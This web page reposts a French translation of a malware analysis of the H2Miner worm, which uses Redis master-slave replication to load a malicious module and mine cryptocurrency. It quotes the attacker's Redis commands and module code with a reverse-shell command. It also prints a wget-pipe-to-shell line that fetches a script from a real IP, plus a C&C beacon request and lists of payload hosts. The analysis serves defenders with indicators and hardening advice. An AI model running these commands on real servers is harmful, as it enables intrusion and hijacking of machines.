<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üò∞ üè§ ü§üüèº D√©couverte d'une nouvelle √©pid√©mie de vers H2Miner exploitant Redis RCE ‚öíÔ∏è üêÜ üîÜ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il y a un jour, l'un des serveurs de mon projet a √©t√© attaqu√© par un ver similaire. √Ä la recherche d'une r√©ponse √† la question ¬´qu'est-ce que c'√©tait?...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>D√©couverte d'une nouvelle √©pid√©mie de vers H2Miner exploitant Redis RCE</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/485300/"><blockquote>  Il y a un jour, l'un des serveurs de mon projet a √©t√© attaqu√© par un ver similaire.  √Ä la recherche d'une r√©ponse √† la question ¬´qu'est-ce que c'√©tait?¬ª, J'ai trouv√© un merveilleux article de l'√©quipe Alibaba Cloud Security.  Comme je n'ai pas trouv√© cet article sur Habr, j'ai d√©cid√© de le traduire sp√©cialement pour vous &lt;3 <br></blockquote><h2>  Entr√©e </h2><br>  L'√©quipe de s√©curit√© d'Alibaba Cloud a r√©cemment d√©couvert une soudaine √©pid√©mie de H2Miner.  Ce type de ver malveillant utilise le manque d'autorisation ou des mots de passe faibles pour Redis comme passerelles vers vos syst√®mes, apr√®s quoi il synchronise son propre module malveillant avec esclave via la synchronisation ma√Ætre-esclave et t√©l√©charge finalement ce module malveillant sur la machine attaqu√©e et ex√©cute des instructions malveillantes. <br><br>  Dans le pass√©, les attaques sur vos syst√®mes √©taient principalement men√©es √† l'aide d'une m√©thode qui comprenait des t√¢ches planifi√©es ou des cl√©s SSH √©crites sur votre machine apr√®s qu'un attaquant se soit connect√© √† Redis.  Heureusement, cette m√©thode ne peut pas √™tre utilis√©e souvent en raison de probl√®mes de contr√¥le des autorisations ou en raison de diff√©rentes versions du syst√®me.  Cependant, cette m√©thode de t√©l√©chargement d'un module malveillant peut ex√©cuter directement les commandes de l'attaquant ou acc√©der au shell, ce qui est dangereux pour votre syst√®me. <br><br>  En raison du grand nombre de serveurs Redis h√©berg√©s sur Internet (pr√®s de 1 million), l'√©quipe de s√©curit√© d'Alibaba Cloud, √† titre de rappel amical, recommande aux utilisateurs de ne pas donner acc√®s √† Redis √† partir du r√©seau et de v√©rifier r√©guli√®rement la force de leurs mots de passe, ainsi que s'ils sont soumis √† s√©lection rapide. <br><br><h2>  H2miner </h2><br>  H2Miner est un botnet d'exploration de donn√©es pour les syst√®mes bas√©s sur Linux qui peut envahir votre syst√®me de diverses mani√®res, y compris le manque d'autorisation dans Hadoop Yarn, Docker et la vuln√©rabilit√© d'ex√©cution de commande √† distance (RCE) de Redis Remote Command.  Le botnet fonctionne en t√©l√©chargeant des scripts malveillants et des logiciels malveillants pour exploiter vos donn√©es, en √©tendant l'attaque horizontalement et en maintenant les communications de commande et de contr√¥le (C&amp;C). <br><a name="habracut"></a><br><h2>  Redis rce </h2><br>  Pavel Toporkov a partag√© ses connaissances sur ce probl√®me lors de ZeroNights 2018. Apr√®s la version 4.0, Redis prend en charge la fonction de chargement de modules externes, qui offre aux utilisateurs la possibilit√© de t√©l√©charger des fichiers compil√©s avec C dans Redis pour ex√©cuter certaines commandes Redis.  Cette fonctionnalit√©, bien qu'utile, contient une vuln√©rabilit√© dans laquelle, en mode ma√Ætre-esclave, les fichiers peuvent √™tre synchronis√©s avec l'esclave via le mode fullresync.  Cela peut √™tre utilis√© par un attaquant pour transf√©rer des fichiers si malveillants.  Une fois le transfert termin√©, les attaquants chargent le module sur l'instance Redis attaqu√©e et ex√©cutent n'importe quelle commande. <br><br><h2>  Analyse de vers de logiciels malveillants </h2><br>  R√©cemment, l'√©quipe de s√©curit√© d'Alibaba Cloud a d√©couvert que la taille du groupe de mineurs malveillants H2Miner a soudainement augment√© de fa√ßon spectaculaire.  Selon l'analyse, le processus g√©n√©ral de survenue d'une attaque est le suivant: <br><br><img src="https://habrastorage.org/webt/sw/1x/g1/sw1xg13bdpaenozpr3mi8zwvhlc.png" alt="image"><br><br>  H2Miner utilise RCE Redis pour une attaque compl√®te.  Premi√®rement, les attaquants attaquent les serveurs Redis non prot√©g√©s ou les serveurs avec des mots de passe faibles. <br><br>  Ensuite, ils utilisent la commande <code>config set dbfilename red2.so</code> pour modifier le nom du fichier.  Apr√®s cela, les attaquants <code>slaveof</code> commande <code>slaveof</code> pour d√©finir l'adresse d'h√¥te de r√©plication ma√Ætre-esclave. <br><br>  Lorsque l'instance attaqu√©e de Redis √©tablit une connexion ma√Ætre-esclave avec le Redis malveillant, qui appartient √† l'attaquant, l'attaquant envoie le module infect√© √† l'aide de la commande fullresync pour synchroniser les fichiers.  Le fichier red2.so sera ensuite t√©l√©charg√© sur la machine cible.  Apr√®s cela, les attaquants utilisent le module de t√©l√©chargement ./red2.so pour t√©l√©charger ce fichier so.  Le module peut ex√©cuter les commandes de l'attaquant ou initier une connexion inverse (porte d√©rob√©e) pour acc√©der √† la machine attaqu√©e. <br><br><pre> <code class="plaintext hljs">if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR) return REDISMODULE_ERR; if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR) return REDISMODULE_ERR;</code> </pre><br>  Apr√®s avoir ex√©cut√© une commande malveillante telle que <code>/ bin / sh -c wget -q -O-http://195.3.146.118/unk.sh | sh&gt; / dev / null 2&gt; &amp; 1</code>  <code>/ bin / sh -c wget -q -O-http://195.3.146.118/unk.sh | sh&gt; / dev / null 2&gt; &amp; 1</code> , l'attaquant r√©initialisera le nom du fichier de sauvegarde et d√©chargera le module syst√®me pour effacer les traces.  Cependant, le fichier red2.so restera toujours sur la machine attaqu√©e.  Il est conseill√© aux utilisateurs de faire attention √† la pr√©sence d'un tel fichier suspect dans le dossier de leur instance Redis. <br><br>  En plus de d√©truire certains processus malveillants pour voler des ressources, l'attaquant a suivi un script malveillant en t√©l√©chargeant et en ex√©cutant les fichiers malveillants sous forme binaire au <a href="http://142.44.191.122/kinsing">142.44.191.122/kinsing</a> .  Cela signifie que le nom du processus ou le nom du r√©pertoire contenant la parent√© sur l'h√¥te peut indiquer que cette machine a √©t√© infect√©e par ce virus. <br><br>  Selon les r√©sultats de l'ing√©nierie inverse, le programme malveillant remplit essentiellement les fonctions suivantes: <br><br><ul><li>  T√©l√©chargement et ex√©cution de fichiers </li><li>  Exploitation mini√®re </li><li>  Maintenir les communications C&amp;C et ex√©cuter les commandes d'attaque </li></ul><br><img src="https://habrastorage.org/webt/na/b1/7-/nab17-lcmbbgi3mjfih7y4rna9i.png" alt="image"><br><br>  Utilisez masscan pour la num√©risation externe pour augmenter l'impact.  De plus, l'adresse IP du serveur C&amp;C est cod√©e en dur dans le programme, et l'h√¥te attaqu√© interagira avec le serveur de communication C&amp;C √† l'aide de requ√™tes HTTP, o√π les informations zombies (serveur pirat√©) sont identifi√©es dans l'en-t√™te HTTP. <br><br><img src="https://habrastorage.org/webt/ue/r7/ll/uer7llye4_ywx693ejkchznykww.png" alt="image"><br><br><pre> <code class="plaintext hljs">GET /h HTTP/1.1 Host: 91.215.169.111 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Arch: amd64 Cores: 2 Mem: 3944 Os: linux Osname: debian Osversion: 10.0 Root: false S: k Uuid: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxx Version: 26 Accept-Encoding: gzip</code> </pre><br><h2>  Autres m√©thodes d'attaque </h2><br><img src="https://habrastorage.org/webt/rl/lh/v0/rllhv0qqjd1szzf7swyjseuhrru.png" alt="image"><br><br><h2>  Adresses et liens que le ver utilise </h2><br>  / parent√© <br><br><pre> <code class="plaintext hljs">‚Ä¢ 142.44.191.122/t.sh ‚Ä¢ 185.92.74.42/h.sh ‚Ä¢ 142.44.191.122/spr.sh ‚Ä¢ 142.44.191.122/spre.sh ‚Ä¢ 195.3.146.118/unk.sh</code> </pre><br>  c &amp; c <br><br><pre> <code class="plaintext hljs">‚Ä¢ 45.10.88.102 ‚Ä¢ 91.215.169.111 ‚Ä¢ 139.99.50.255 ‚Ä¢ 46.243.253.167 ‚Ä¢ 195.123.220.193</code> </pre><br><h2>  Astuce </h2><br>  Tout d'abord, Redis ne doit pas √™tre ouvert √† l'acc√®s √† partir d'Internet et doit √™tre prot√©g√© par un mot de passe fort.  Il est √©galement important que les clients v√©rifient qu'il n'y a pas de fichier red2.so dans le r√©pertoire Redis et pas de ¬´kinsing¬ª dans le nom de fichier / processus sur l'h√¥te. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr485300/">https://habr.com/ru/post/fr485300/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr485286/index.html">Comment nous avons pes√© des marchandises ou une petite ode d'automatisation</a></li>
<li><a href="../fr485288/index.html">L'amour pour d√©tester indie gamedev'a</a></li>
<li><a href="../fr485290/index.html">Guide de distillation BERT simple</a></li>
<li><a href="../fr485294/index.html">Cours moderne sur Node.js en 2020</a></li>
<li><a href="../fr485298/index.html">Le myst√©rieux programme LyX. Partie 4</a></li>
<li><a href="../fr485304/index.html">Quelques astuces sur les √©l√©ments iframe</a></li>
<li><a href="../fr485312/index.html">DevOps pour applications mobiles</a></li>
<li><a href="../fr485316/index.html">Tous les SERP Google ressemblent d√©sormais √† des publicit√©s</a></li>
<li><a href="../fr485318/index.html">Ajout de beaut√© et d'interactivit√© aux ordinateurs portables Jupyter</a></li>
<li><a href="../fr485322/index.html">Parlez de PostgreSQL. Entretien avec Alexei Lesovsky dans le podcast Zinc Prod. Premi√®re partie</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>